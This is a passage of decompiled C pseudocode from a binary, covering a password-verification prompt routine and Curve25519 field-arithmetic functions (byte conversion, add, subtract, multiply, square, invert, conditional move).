// 5392A0: using guessed type int dword_5392A0;
// 5392A4: using guessed type int dword_5392A4;
// 5392A8: using guessed type int dword_5392A8;
// 5392B4: using guessed type int dword_5392B4;
// 4727A0: using guessed type WCHAR Buffer[512];

//----- (00472A80) --------------------------------------------------------
int __cdecl sub_472A80(int a1, _DWORD *a2)
{
  int v2; // eax
  int v3; // eax
  const char *v4; // eax
  const char *v5; // eax
  char v6; // al
  int result; // eax
  const char *v8; // eax
  char v9; // al
  const char *v10; // edi
  const char *v11; // eax
  char v12; // al
  FILE *v13; // [esp-4h] [ebp-Ch]
  FILE *v14; // [esp-4h] [ebp-Ch]
  FILE *v15; // [esp-4h] [ebp-Ch]

  v2 = sub_445DB0((int)a2) - 1;
  if ( v2 )
  {
    v3 = v2 - 1;
    if ( v3 )
    {
      if ( v3 == 1 )
      {
        v13 = dword_5392AC;
        v4 = (const char *)sub_445DD0((int)a2);
        fputs(v4, v13);
        v14 = dword_5392AC;
        v5 = (const char *)sub_445DE0(a2);
        fputs(v5, v14);
        fflush(dword_5392AC);
        v6 = sub_445DC0((int)a2);
        return sub_4727A0(v6 & 1, a1, (int)a2, 0);
      }
    }
    else
    {
      v8 = (const char *)sub_445DD0((int)a2);
      fprintf(dword_5392AC, "Verifying - %s", v8);
      fflush(dword_5392AC);
      v9 = sub_445DC0((int)a2);
      result = sub_4727A0(v9 & 1, a1, (int)a2, 1);
      if ( result <= 0 )
        return result;
      v10 = (const char *)sub_445E20(a2);
      if ( strcmp((const char *)sub_445E00(a2), v10) )
      {
        fprintf(dword_5392AC, "Verify failure\n");
        fflush(dword_5392AC);
        return 0;
      }
    }
    return 1;
  }
  else
  {
    v15 = dword_5392AC;
    v11 = (const char *)sub_445DD0((int)a2);
    fputs(v11, v15);
    fflush(dword_5392AC);
    v12 = sub_445DC0((int)a2);
    return sub_4727A0(v12 & 1, a1, (int)a2, 1);
  }
}

//----- (00472C00) --------------------------------------------------------
int __usercall sub_472C00@<eax>(unsigned __int8 *a1@<ecx>, _DWORD *a2@<edi>)
{
  unsigned __int64 v3; // rt0
  int v4; // ecx
  unsigned __int64 v5; // rax
  unsigned __int64 v6; // kr10_8
  unsigned __int64 v7; // kr20_8
  unsigned __int64 v8; // kr28_8
  int result; // eax
  unsigned __int64 v10; // [esp+24h] [ebp-70h]
  unsigned __int64 v11; // [esp+34h] [ebp-60h]
  __int64 v12; // [esp+3Ch] [ebp-58h]
  unsigned __int64 v13; // [esp+5Ch] [ebp-38h]
  unsigned __int64 v14; // [esp+64h] [ebp-30h]
  int v15; // [esp+8Ch] [ebp-8h]

  v3 = a1[4] | (unsigned __int64)(*(unsigned __int16 *)(a1 + 5) << 8);
  LODWORD(v12) = 8 * (a1[10] | (*(unsigned __int16 *)(a1 + 11) << 8));
  HIDWORD(v12) = a1[19] << 8;
  v13 = (unsigned __int64)a1[25] << 8;
  v10 = 32 * (a1[23] | (unsigned __int64)(*((unsigned __int16 *)a1 + 12) << 8));
  v4 = (a1[30] | (unsigned __int16)(a1[31] << 8)) & 0x7FFF;
  v5 = a1[29] | (unsigned __int64)(unsigned int)(v4 << 8);
  LODWORD(v5) = 4 * v5;
  v15 = v5;
  v6 = 19 * ((__int64)(__PAIR64__((a1[29] | (unsigned __int64)(unsigned int)(v4 << 8)) >> 30, 0x1000000) + v5) >> 25)
     + (((a1[1] | ((unsigned __int64)*((unsigned __int16 *)a1 + 1) << 8)) << 8) | *a1);
  v7 = ((__int64)((v3 << 6) + 0x1000000) >> 25) + 32 * (a1[7] | ((a1[8] | (unsigned __int64)(a1[9] << 8)) << 8));
  v11 = ((v12 + 0x1000000) >> 25) + 4 * (a1[13] | ((a1[14] | (unsigned __int64)(a1[15] << 8)) << 8));
  v14 = ((__int64)(v13 + 0x1000000) >> 25) + ((a1[20] | ((unsigned __int64)*(unsigned __int16 *)(a1 + 21) << 8)) << 7);
  v8 = ((__int64)(v10 + 0x1000000) >> 25) + 16 * (a1[26] | ((a1[27] | (unsigned __int64)(a1[28] << 8)) << 8));
  *a2 = v6 - ((v6 + 0x2000000) & 0xFC000000);
  a2[1] = ((_DWORD)v3 << 6) + ((__int64)(v6 + 0x2000000) >> 26) - ((((_DWORD)v3 << 6) + 0x1000000) & 0xFE000000);
  a2[2] = v7 - ((v7 + 0x2000000) & 0xFC000000);
  a2[3] = v12 + ((__int64)(v7 + 0x2000000) >> 26) - ((v12 + 0x1000000) & 0xFE000000);
  a2[4] = v11 - ((v11 + 0x2000000) & 0xFC000000);
  a2[5] = v13 + ((__int64)(v11 + 0x2000000) >> 26) - ((v13 + 0x1000000) & 0xFE000000);
  a2[6] = v14 - ((v14 + 0x2000000) & 0xFC000000);
  a2[7] = v10 + ((__int64)(v14 + 0x2000000) >> 26) - ((v10 + 0x1000000) & 0xFE000000);
  a2[8] = v8 - ((v8 + 0x2000000) & 0xFC000000);
  result = (v5 + 0x1000000) & 0xFE000000;
  a2[9] = v15 + ((__int64)(v8 + 0x2000000) >> 26) - result;
  return result;
}

//----- (00473100) --------------------------------------------------------
int __cdecl sub_473100(int a1)
{
  _DWORD *v1; // ecx
  int result; // eax
  int v3; // edx
  int v4; // ecx
  int v5; // edx
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v10; // esi
  int v11; // ecx
  int v12; // [esp+Ch] [ebp-1Ch]
  int v13; // [esp+Ch] [ebp-1Ch]
  int v14; // [esp+10h] [ebp-18h]
  int v15; // [esp+10h] [ebp-18h]
  int v16; // [esp+14h] [ebp-14h]
  int v17; // [esp+14h] [ebp-14h]
  int v18; // [esp+18h] [ebp-10h]
  int v19; // [esp+18h] [ebp-10h]
  int v20; // [esp+1Ch] [ebp-Ch]
  int v21; // [esp+20h] [ebp-8h]
  int v22; // [esp+20h] [ebp-8h]
  int v23; // [esp+24h] [ebp-4h]
  int v24; // [esp+2Ch] [ebp+4h]
  int v25; // [esp+2Ch] [ebp+4h]

  result = a1;
  v3 = v1[1];
  v21 = v1[2];
  v24 = v1[3];
  v12 = v1[4];
  v14 = v1[5];
  v16 = v1[6];
  v18 = v1[7];
  v23 = v1[9];
  v20 = v1[8];
  v4 = 19
     * ((v23
       + ((v20
         + ((v18
           + ((v16
             + ((v14
               + ((v12 + ((v24 + ((v21 + ((v3 + ((*v1 + ((19 * v23 + 0x1000000) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)) >> 26)) >> 25)
     + *v1;
  v5 = (v4 >> 26) + v3;
  v22 = (v5 >> 25) + v21;
  v6 = (v22 >> 26) + v24;
  v25 = v6 & 0x1FFFFFF;
  v7 = (v6 >> 25) + v12;
  v13 = v7 & 0x3FFFFFF;
  v8 = (v7 >> 26) + v14;
  v15 = v8 & 0x1FFFFFF;
  v9 = (v8 >> 25) + v16;
  v17 = v9 & 0x3FFFFFF;
  v19 = (v9 >> 26) + v18;
  v4 &= 0x3FFFFFFu;
  v5 &= 0x1FFFFFFu;
  *(_WORD *)result = v4;
  *(_BYTE *)(result + 2) = BYTE2(v4);
  *(_BYTE *)(result + 3) = (4 * v5) | HIBYTE(v4);
  *(_BYTE *)(result + 4) = v5 >> 6;
  *(_BYTE *)(result + 5) = v5 >> 14;
  *(_BYTE *)(result + 6) = (8 * v22) | (v5 >> 22);
  *(_BYTE *)(result + 7) = (v22 & 0x3FFFFFF) >> 5;
  *(_BYTE *)(result + 8) = (v22 & 0x3FFFFFF) >> 13;
  *(_BYTE *)(result + 9) = (32 * v25) | ((v22 & 0x3FFFFFF) >> 21);
  *(_BYTE *)(result + 10) = v25 >> 3;
  *(_BYTE *)(result + 11) = v25 >> 11;
  v10 = (v19 >> 25) + v20;
  *(_BYTE *)(result + 12) = ((_BYTE)v13 << 6) | (v25 >> 19);
  *(_BYTE *)(result + 13) = v13 >> 2;
  *(_BYTE *)(result + 15) = v13 >> 18;
  *(_BYTE *)(result + 14) = v13 >> 10;
  *(_WORD *)(result + 17) = *(_WORD *)((char *)&v15 + 1);
  *(_BYTE *)(result + 16) = v15;
  *(_BYTE *)(result + 19) = (2 * v17) | HIBYTE(v15);
  *(_BYTE *)(result + 20) = v17 >> 7;
  *(_BYTE *)(result + 21) = v17 >> 15;
  *(_BYTE *)(result + 22) = (8 * v19) | (v17 >> 23);
  *(_BYTE *)(result + 23) = (v19 & 0x1FFFFFF) >> 5;
  *(_BYTE *)(result + 24) = (v19 & 0x1FFFFFF) >> 13;
  *(_BYTE *)(result + 25) = (16 * v10) | ((v19 & 0x1FFFFFF) >> 21);
  *(_BYTE *)(result + 26) = (v10 & 0x3FFFFFF) >> 4;
  *(_BYTE *)(result + 27) = (v10 & 0x3FFFFFF) >> 12;
  v11 = ((v10 >> 26) + v23) & 0x1FFFFFF;
  *(_BYTE *)(result + 28) = (((unsigned __int8)(v10 >> 26) + (_BYTE)v23) << 6) | ((v10 & 0x3FFFFFF) >> 20);
  *(_BYTE *)(result + 29) = v11 >> 2;
  *(_BYTE *)(result + 30) = v11 >> 10;
  *(_BYTE *)(result + 31) = v11 >> 18;
  return result;
}
// 473114: variable 'v1' is possibly undefined

//----- (004733A0) --------------------------------------------------------
_DWORD *__fastcall sub_4733A0(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax

  result = a3;
  *a2 = *a3 + *a1;
  a2[1] = a3[1] + a1[1];
  a2[2] = a3[2] + a1[2];
  a2[3] = a3[3] + a1[3];
  a2[4] = a3[4] + a1[4];
  a2[5] = a3[5] + a1[5];
  a2[6] = a3[6] + a1[6];
  a2[7] = a3[7] + a1[7];
  a2[8] = a3[8] + a1[8];
  a2[9] = a3[9] + a1[9];
  return result;
}

//----- (00473400) --------------------------------------------------------
_DWORD *__fastcall sub_473400(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax

  result = a3;
  *a2 = *a1 - *a3;
  a2[1] = a1[1] - a3[1];
  a2[2] = a1[2] - a3[2];
  a2[3] = a1[3] - a3[3];
  a2[4] = a1[4] - a3[4];
  a2[5] = a1[5] - a3[5];
  a2[6] = a1[6] - a3[6];
  a2[7] = a1[7] - a3[7];
  a2[8] = a1[8] - a3[8];
  a2[9] = a1[9] - a3[9];
  return result;
}

//----- (00473460) --------------------------------------------------------
int __cdecl sub_473460(_DWORD *a1, int *a2)
{
  int *v2; // ecx
  __int64 v3; // rcx
  unsigned int v4; // esi
  __int64 v5; // kr58_8
  unsigned __int64 v6; // kr60_8
  __int64 v7; // kr68_8
  __int64 v8; // kr98_8
  signed __int64 v9; // rax
  int result; // eax
  int v11; // [esp+Ch] [ebp-144h]
  __int64 v12; // [esp+Ch] [ebp-144h]
  int v13; // [esp+14h] [ebp-13Ch]
  __int64 v14; // [esp+14h] [ebp-13Ch]
  __int64 v15; // [esp+1Ch] [ebp-134h]
  __int64 v16; // [esp+24h] [ebp-12Ch]
  __int64 v17; // [esp+2Ch] [ebp-124h]
  __int64 v18; // [esp+34h] [ebp-11Ch]
  __int64 v19; // [esp+3Ch] [ebp-114h]
  __int64 v20; // [esp+44h] [ebp-10Ch]
  __int64 v21; // [esp+4Ch] [ebp-104h]
  int v22; // [esp+54h] [ebp-FCh]
  __int64 v23; // [esp+54h] [ebp-FCh]
  __int64 v24; // [esp+5Ch] [ebp-F4h]
  __int64 v25; // [esp+64h] [ebp-ECh]
  __int64 v26; // [esp+64h] [ebp-ECh]
  __int64 v27; // [esp+6Ch] [ebp-E4h]
  int v28; // [esp+74h] [ebp-DCh]
  __int64 v29; // [esp+7Ch] [ebp-D4h]
  __int64 v30; // [esp+7Ch] [ebp-D4h]
  __int64 v31; // [esp+84h] [ebp-CCh]
  __int64 v32; // [esp+8Ch] [ebp-C4h]
  __int64 v33; // [esp+94h] [ebp-BCh]
  __int64 v34; // [esp+9Ch] [ebp-B4h]
  __int64 v35; // [esp+A4h] [ebp-ACh]
  int v36; // [esp+ACh] [ebp-A4h]
  int v37; // [esp+B4h] [ebp-9Ch]
  int v38; // [esp+BCh] [ebp-94h]
  int v39; // [esp+C4h] [ebp-8Ch]
  __int64 v40; // [esp+C4h] [ebp-8Ch]
  __int64 v41; // [esp+CCh] [ebp-84h]
  __int64 v42; // [esp+D4h] [ebp-7Ch]
  int v43; // [esp+DCh] [ebp-74h]
  __int64 v44; // [esp+DCh] [ebp-74h]
  int v45; // [esp+E4h] [ebp-6Ch]
  __int64 v46; // [esp+E4h] [ebp-6Ch]
  __int64 v47; // [esp+ECh] [ebp-64h]
  __int64 v48; // [esp+F4h] [ebp-5Ch]
  int v49; // [esp+FCh] [ebp-54h]
  int v50; // [esp+104h] [ebp-4Ch]
  int v51; // [esp+10Ch] [ebp-44h]
  __int64 v52; // [esp+118h] [ebp-38h]
  __int64 v53; // [esp+120h] [ebp-30h]
  int v54; // [esp+130h] [ebp-20h]
  __int64 v55; // [esp+138h] [ebp-18h]
  __int64 v56; // [esp+148h] [ebp-8h]

  v45 = v2[3];
  v37 = v2[5];
  v36 = v2[7];
  v38 = v2[9];
  v49 = a2[6];
  v54 = a2[7];
  v39 = a2[1];
  v51 = a2[9];
  v50 = a2[8];
  v13 = v2[1];
  v28 = a2[2];
  v22 = a2[3];
  v43 = a2[4];
  v11 = a2[5];
  v34 = 2 * v38;
  v41 = 2 * v13;
  v24 = 19 * v51;
  v47 = 2 * v45;
  v21 = 19 * v54;
  v42 = 2 * v37;
  v29 = 19 * v11;
  v48 = 2 * v36;
  v33 = 19 * v22;
  v35 = 19 * v28;
  v17 = v2[8];
  v32 = 19 * v43;
  v19 = v2[6];
  v25 = 19 * v49;
  v20 = v2[4];
  v15 = 19 * v50;
  v18 = v2[2];
  v16 = *a2;
  v27 = *v2;
  HIDWORD(v3) = (unsigned __int64)(v24 * v41
                                 + v21 * v47
                                 + v29 * v42
                                 + v33 * v48
                                 + v17 * v35
                                 + v19 * v32
                                 + v20 * v25
                                 + v18 * v15
                                 + v27 * v16
                                 + 19 * v39 * v34) >> 32;
  v4 = v24 * v41
     + v21 * v47
     + v29 * v42
     + v33 * v48
     + v17 * v35
     + v19 * v32
     + v20 * v25
     + v18 * v15
     + v27 * v16
     + 19 * v39 * v34;
  v31 = v22;
  v23 = v39;
  v40 = v43;
  v5 = v29 * v34
     + v42 * v24
     + v48 * v21
     + v31 * v41
     + v23 * v47
     + v25 * v17
     + v15 * v19
     + v16 * v20
     + v28 * v18
     + v43 * v27;
  v44 = v45;
  v46 = v13;
  v52 = ((__int64)(__PAIR64__(HIDWORD(v3), v4) + 0x2000000) >> 26)
      + v18 * v24
      + v20 * v21
      + v19 * v29
      + v17 * v33
      + v38 * v35
      + v36 * v32
      + v23 * v27
      + v37 * v25
      + v44 * v15
      + v13 * v16;
  v14 = v11;
  v55 = ((v5 + 0x2000000) >> 26)
      + v19 * v24
      + v17 * v21
      + v23 * v20
      + v31 * v18
      + v38 * v25
      + v36 * v15
      + v37 * v16
      + v11 * v27
      + v44 * v28
      + v46 * v40;
  v53 = ((v52 + 0x1000000) >> 25)
      + v47 * v24
      + v33 * v34
      + v42 * v21
      + v48 * v29
      + v23 * v41
      + v32 * v17
      + v25 * v19
      + v15 * v20
      + v16 * v18
      + v28 * v27;
  v56 = ((v55 + 0x1000000) >> 25)
      + v21 * v34
      + v48 * v24
      + v31 * v47
      + v23 * v42
      + v15 * v17
      + v16 * v19
      + v28 * v20
      + v11 * v41
      + v40 * v18
      + v49 * v27;
  v26 = ((v53 + 0x2000000) >> 26)
      + v20 * v24
      + v19 * v21
      + v17 * v29
      + v38 * v32
      + v23 * v18
      + v31 * v27
      + v36 * v25
      + v37 * v15
      + v44 * v16
      + v46 * v28;
  v30 = ((v56 + 0x2000000) >> 26)
      + v17 * v24
      + v23 * v19
      + v31 * v20
      + v38 * v15
      + v36 * v16
      + v11 * v18
      + v37 * (__int64)v28
      + v44 * v40
      + v54 * v27
      + v49 * v46;
  v6 = ((v26 + 0x1000000) >> 25)
     - __PAIR64__((unsigned __int64)(v5 + 0x2000000) >> 32, (v5 + 0x2000000) & 0xFC000000)
     + v5;
  v12 = v31 * v42 + v16 * v17 + v23 * v48 + v28 * v19 + v40 * v20 + v11 * v47 + v54 * v41 + v49 * v18 + v50 * v27;
  v7 = ((v30 + 0x1000000) >> 25) + v24 * v34 + v12;
  v8 = ((v7 + 0x2000000) >> 26)
     + v23 * v17
     + v31 * v19
     + v38 * v16
     + v14 * v20
     + v36 * (__int64)v28
     + v37 * v40
     + v54 * v18
     + v49 * v44
     + v50 * v46
     + v51 * v27;
  LODWORD(v3) = 19 * ((v8 + 0x1000000) >> 25) - ((v4 + 0x2000000) & 0xFC000000);
  v9 = v3
     + __PAIR64__(
         (19 * ((v8 + 0x1000000) >> 25)
        - __PAIR64__((__PAIR64__(HIDWORD(v3), v4) + 0x2000000) >> 32, (v4 + 0x2000000) & 0xFC000000)) >> 32,
         v4)
     + 0x2000000;
  *a1 = v3 + v4 - (v9 & 0xFC000000);
  a1[1] = v52 + (v9 >> 26) - ((v52 + 0x1000000) & 0xFE000000);
  a1[2] = v53 - ((v53 + 0x2000000) & 0xFC000000);
  a1[3] = v26 - ((v26 + 0x1000000) & 0xFE000000);
  a1[4] = v6 - ((v6 + 0x2000000) & 0xFC000000);
  a1[5] = v55 + ((__int64)(v6 + 0x2000000) >> 26) - ((v55 + 0x1000000) & 0xFE000000);
  a1[6] = v56 - ((v56 + 0x2000000) & 0xFC000000);
  a1[7] = v30 - ((v30 + 0x1000000) & 0xFE000000);
  result = (v8 + 0x1000000) & 0xFE000000;
  a1[9] = v8 - result;
  a1[8] = ((v30 + 0x1000000) >> 25) + v24 * v34 + v12 - ((v7 + 0x2000000) & 0xFC000000);
  return result;
}
// 473483: variable 'v2' is possibly undefined

//----- (00474A00) --------------------------------------------------------
int __cdecl sub_474A00(_DWORD *a1, int *a2)
{
  int v2; // esi
  int v3; // ecx
  int v4; // edi
  __int64 v5; // rcx
  unsigned int v6; // esi
  __int64 v7; // kr40_8
  __int64 v8; // kr48_8
  __int64 v9; // rax
  bool v10; // cf
  __int64 v11; // rax
  unsigned __int64 v12; // kr50_8
  __int64 v13; // rax
  __int64 v14; // kr58_8
  __int64 v15; // kr68_8
  signed __int64 v16; // rax
  int result; // eax
  int v18; // [esp+10h] [ebp-ECh]
  __int64 v19; // [esp+10h] [ebp-ECh]
  __int64 v20; // [esp+10h] [ebp-ECh]
  __int64 v21; // [esp+10h] [ebp-ECh]
  __int64 v22; // [esp+18h] [ebp-E4h]
  int v23; // [esp+20h] [ebp-DCh]
  __int64 v24; // [esp+28h] [ebp-D4h]
  __int64 v25; // [esp+30h] [ebp-CCh]
  __int64 v26; // [esp+38h] [ebp-C4h]
  __int64 v27; // [esp+40h] [ebp-BCh]
  __int64 v28; // [esp+48h] [ebp-B4h]
  __int64 v29; // [esp+50h] [ebp-ACh]
  __int64 v30; // [esp+58h] [ebp-A4h]
  __int64 v31; // [esp+68h] [ebp-94h]
  __int64 v32; // [esp+70h] [ebp-8Ch]
  int v33; // [esp+78h] [ebp-84h]
  int v34; // [esp+80h] [ebp-7Ch]
  __int64 v35; // [esp+88h] [ebp-74h]
  __int64 v36; // [esp+88h] [ebp-74h]
  __int64 v37; // [esp+90h] [ebp-6Ch]
  int v38; // [esp+98h] [ebp-64h]
  __int64 v39; // [esp+98h] [ebp-64h]
  __int64 v40; // [esp+A8h] [ebp-54h]
  __int64 v41; // [esp+B0h] [ebp-4Ch]
  int v42; // [esp+C0h] [ebp-3Ch]
  __int64 v43; // [esp+C4h] [ebp-38h]
  __int64 v44; // [esp+CCh] [ebp-30h]
  __int64 v45; // [esp+D4h] [ebp-28h]

  v38 = a2[1];
  v2 = a2[5];
  v34 = a2[3];
  v3 = a2[7];
  v4 = a2[6];
  v42 = a2[9];
  v23 = a2[2];
  LODWORD(v30) = a2[4];
  v18 = a2[8];
  v33 = 2 * v2;
  v41 = v2;
  v37 = 19 * v4;
  v40 = 2 * (int)v30;
  v24 = 38 * v3;
  v29 = 2 * v34;
  v32 = 2 * v23;
  v28 = 19 * v18;
  v27 = 38 * v42;
  v25 = 2 * v38;
  HIDWORD(v5) = (unsigned __int64)(v40 * v37
                                 + v29 * v24
                                 + v32 * v28
                                 + v25 * v27
                                 + *a2 * (__int64)*a2
                                 + 38 * v2 * (__int64)v2) >> 32;
  v6 = v40 * v37 + v29 * v24 + v32 * v28 + v25 * v27 + *a2 * *a2 + 38 * v2 * v2;
  v26 = 2 * *a2;
  v30 = (int)v30;
  v7 = v25 * v29 + v3 * v24 + v33 * v27 + (int)v30 * v26 + v23 * (__int64)v23 + 2 * v4 * v28;
  v35 = v38;
  v8 = ((__int64)(__PAIR64__(HIDWORD(v5), v6) + 0x2000000) >> 26)
     + v28 * v29
     + v33 * v37
     + (int)v30 * v24
     + v23 * v27
     + v38 * v26;
  v39 = 2 * v3;
  v44 = ((v7 + 0x2000000) >> 26) + v26 * v41 + (int)v30 * v25 + v39 * v28 + v4 * v27 + v34 * v32;
  v43 = ((v8 + 0x1000000) >> 25) + v28 * v40 + v27 * v29 + v33 * v24 + v4 * v37 + v35 * v25 + v23 * v26;
  v22 = v18;
  v19 = (int)v30 * v32 + v34 * v29 + v39 * v27 + v18 * v28 + v4 * v26;
  v9 = v33 * v25;
  v10 = __CFADD__((_DWORD)v9, (_DWORD)v19);
  LODWORD(v19) = v9 + v19;
  LODWORD(v9) = v44 + 0x1000000;
  HIDWORD(v19) += HIDWORD(v9) + v10;
  HIDWORD(v9) = (unsigned __int64)(v44 + 0x1000000) >> 32;
  v45 = (v9 >> 25) + v19;
  v20 = (int)v30 * v27 + v23 * v25 + v4 * v24 + v34 * v26;
  v11 = v33 * v28;
  v10 = __CFADD__((_DWORD)v11, (_DWORD)v20);
  LODWORD(v20) = v11 + v20;
  LODWORD(v11) = v43 + 0x2000000;
  HIDWORD(v20) += HIDWORD(v11) + v10;
  HIDWORD(v11) = (unsigned __int64)(v43 + 0x2000000) >> 32;
  v31 = (v11 >> 26) + v20;
  v36 = ((v45 + 0x2000000) >> 26) + v32 * v41 + (int)v30 * v29 + v4 * v25 + v26 * v3 + v22 * v27;
  v12 = ((v31 + 0x1000000) >> 25)
      - __PAIR64__((unsigned __int64)(v7 + 0x2000000) >> 32, (v7 + 0x2000000) & 0xFC000000)
      + v7;
  v21 = v4 * v32 + v39 * v25 + v30 * v30 + v22 * v26 + v42 * v27;
  v13 = v33 * v29;
  v10 = __CFADD__((_DWORD)v13, (_DWORD)v21);
  LODWORD(v21) = v13 + v21;
  LODWORD(v13) = v36 + 0x1000000;
  HIDWORD(v21) += HIDWORD(v13) + v10;
  HIDWORD(v13) = (unsigned __int64)(v36 + 0x1000000) >> 32;
  v14 = (v13 >> 25) + v21;
  v15 = ((v14 + 0x2000000) >> 26) + v40 * v41 + v3 * v32 + v4 * v29 + v22 * v25 + v42 * v26;
  LODWORD(v5) = 19 * ((v15 + 0x1000000) >> 25) - ((v6 + 0x2000000) & 0xFC000000);
  v16 = v5
      + __PAIR64__(
          (19 * ((v15 + 0x1000000) >> 25)
         - __PAIR64__((__PAIR64__(HIDWORD(v5), v6) + 0x2000000) >> 32, (v6 + 0x2000000) & 0xFC000000)) >> 32,
          v6)
      + 0x2000000;
  *a1 = v5 + v6 - (v16 & 0xFC000000);
  a1[1] = v8 + (v16 >> 26) - ((v8 + 0x1000000) & 0xFE000000);
  a1[2] = v43 - ((v43 + 0x2000000) & 0xFC000000);
  a1[3] = v31 - ((v31 + 0x1000000) & 0xFE000000);
  a1[4] = v12 - ((v12 + 0x2000000) & 0xFC000000);
  a1[5] = v44 + ((__int64)(v12 + 0x2000000) >> 26) - ((v44 + 0x1000000) & 0xFE000000);
  a1[6] = v45 - ((v45 + 0x2000000) & 0xFC000000);
  a1[7] = v36 - ((v36 + 0x1000000) & 0xFE000000);
  result = (v15 + 0x1000000) & 0xFE000000;
  a1[9] = v15 - result;
  a1[8] = v14 - ((v14 + 0x2000000) & 0xFC000000);
  return result;
}

//----- (004756E0) --------------------------------------------------------
int __cdecl sub_4756E0(_DWORD *a1)
{
  int *v1; // ecx
  int v2; // esi
  int v3; // esi
  int v4; // esi
  int v5; // esi
  int v6; // esi
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v11[10]; // [esp+4h] [ebp-A0h] BYREF
  int v12[10]; // [esp+2Ch] [ebp-78h] BYREF
  int v13[10]; // [esp+54h] [ebp-50h] BYREF
  int v14[10]; // [esp+7Ch] [ebp-28h] BYREF

  sub_474A00(v14, v1);
  sub_474A00(v12, v14);
  sub_474A00(v12, v12);
  sub_473460(v12, v12);
  sub_473460(v14, v12);
  sub_474A00(v11, v14);
  sub_473460(v12, v11);
  sub_474A00(v11, v12);
  v2 = 4;
  do
  {
    sub_474A00(v11, v11);
    --v2;
  }
  while ( v2 );
  sub_473460(v12, v12);
  sub_474A00(v11, v12);
  v3 = 9;
  do
  {
    sub_474A00(v11, v11);
    --v3;
  }
  while ( v3 );
  sub_473460(v11, v12);
  sub_474A00(v13, v11);
  v4 = 19;
  do
  {
    sub_474A00(v13, v13);
    --v4;
  }
  while ( v4 );
  sub_473460(v11, v11);
  v5 = 10;
  do
  {
    sub_474A00(v11, v11);
    --v5;
  }
  while ( v5 );
  sub_473460(v12, v12);
  sub_474A00(v11, v12);
  v6 = 49;
  do
  {
    sub_474A00(v11, v11);
    --v6;
  }
  while ( v6 );
  sub_473460(v11, v12);
  sub_474A00(v13, v11);
  v7 = 99;
  do
  {
    sub_474A00(v13, v13);
    --v7;
  }
  while ( v7 );
  sub_473460(v11, v11);
  sub_474A00(v11, v11);
  v8 = 49;
  do
  {
    sub_474A00(v11, v11);
    --v8;
  }
  while ( v8 );
  sub_473460(v12, v12);
  sub_474A00(v12, v12);
  v9 = 4;
  do
  {
    sub_474A00(v12, v12);
    --v9;
  }
  while ( v9 );
  return sub_473460(a1, v14);
}
// 4756F3: variable 'v1' is possibly undefined
// 4756E0: using guessed type int var_28[10];
// 4756E0: using guessed type int var_78[10];
// 4756E0: using guessed type int var_A0[10];
// 4756E0: using guessed type int var_50[10];

//----- (00475960) --------------------------------------------------------
_DWORD *__fastcall sub_475960(int a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // esi
  int v6; // edi
  int v7; // esi
  int v8; // edi
  int v9; // esi
  int v10; // edi
  int v11; // esi
  int v12; // edi
  int v13; // esi
  int v14; // edi
  int v15; // esi
  int v16; // edi
  int v17; // esi
  int v18; // edi
  int v19; // esi
  int v20; // edi
  int v21; // esi

  result = a3;
  v4 = -a1;
  v5 = a3[1];
  *a3 ^= v4 & (*a3 ^ *a2);
  v6 = v5 ^ v4 & (v5 ^ a2[1]);
  v7 = a3[2];
  a3[1] = v6;
  v8 = v7 ^ v4 & (v7 ^ a2[2]);
  v9 = a3[3];
  a3[2] = v8;
  v10 = v9 ^ v4 & (v9 ^ a2[3]);
  v11 = a3[4];
  a3[3] = v10;
  v12 = v11 ^ v4 & (v11 ^ a2[4]);
  v13 = a3[5];
  a3[4] = v12;
  v14 = v13 ^ v4 & (v13 ^ a2[5]);
  v15 = a3[6];
  a3[5] = v14;
  v16 = v15 ^ v4 & (v15 ^ a2[6]);
  v17 = a3[7];
  a3[6] = v16;
  v18 = v17 ^ v4 & (v17 ^ a2[7]);
  v19 = a3[8];
  a3[7] = v18;
  v20 = v19 ^ v4 & (v19 ^ a2[8]);
  v21 = a3[9];
  a3[8] = v20;
  a3[9] = v21 ^ v4 & (v21 ^ a2[9]);
  return result;
}

//----- (00475A00) --------------------------------------------------------
int __usercall sub_475A00@<eax>(_DWORD *a1@<esi>, int *a2)
{
  int v2; // ebx
  int v3; // ecx
  __int64 v4; // kr90_8
  __int64 v5; // krB0_8
  __int64 v6; // krC8_8
  signed __int64 v7; // rax
  int result; // eax
  __int64 v9; // [esp+Ch] [ebp-ECh]
  int v10; // [esp+14h] [ebp-E4h]
  __int64 v11; // [esp+14h] [ebp-E4h]
  __int64 v12; // [esp+24h] [ebp-D4h]
  __int64 v13; // [esp+2Ch] [ebp-CCh]
  unsigned __int64 v14; // [esp+2Ch] [ebp-CCh]
  __int64 v15; // [esp+3Ch] [ebp-BCh]
  __int64 v16; // [esp+44h] [ebp-B4h]
  __int64 v17; // [esp+4Ch] [ebp-ACh]
  __int64 v18; // [esp+54h] [ebp-A4h]
  int v19; // [esp+5Ch] [ebp-9Ch]
  __int64 v20; // [esp+64h] [ebp-94h]
  __int64 v21; // [esp+64h] [ebp-94h]
  __int64 v22; // [esp+6Ch] [ebp-8Ch]
  int v23; // [esp+74h] [ebp-84h]
  __int64 v24; // [esp+84h] [ebp-74h]
  int v25; // [esp+8Ch] [ebp-6Ch]
  int v26; // [esp+94h] [ebp-64h]
  __int64 v27; // [esp+94h] [ebp-64h]
  __int64 v28; // [esp+ACh] [ebp-4Ch]
  int v29; // [esp+B4h] [ebp-44h]
  __int64 v30; // [esp+B4h] [ebp-44h]
  __int64 v31; // [esp+BCh] [ebp-3Ch]
  __int64 v32; // [esp+D4h] [ebp-24h]
  int v33; // [esp+DCh] [ebp-1Ch]
  __int64 v34; // [esp+E0h] [ebp-18h]
  __int64 v35; // [esp+E8h] [ebp-10h]

  v25 = a2[3];
  v23 = a2[1];
  v29 = a2[6];
  v2 = a2[7];
  v26 = a2[4];
  v3 = a2[5];
  v33 = a2[9];
  v10 = a2[2];
  v19 = a2[8];
  v22 = 19 * v29;
  v28 = 2 * v26;
  v20 = 38 * v2;
  v18 = 2 * v25;
  v12 = 19 * v19;
  v24 = 2 * v10;
  v15 = 2 * v23;
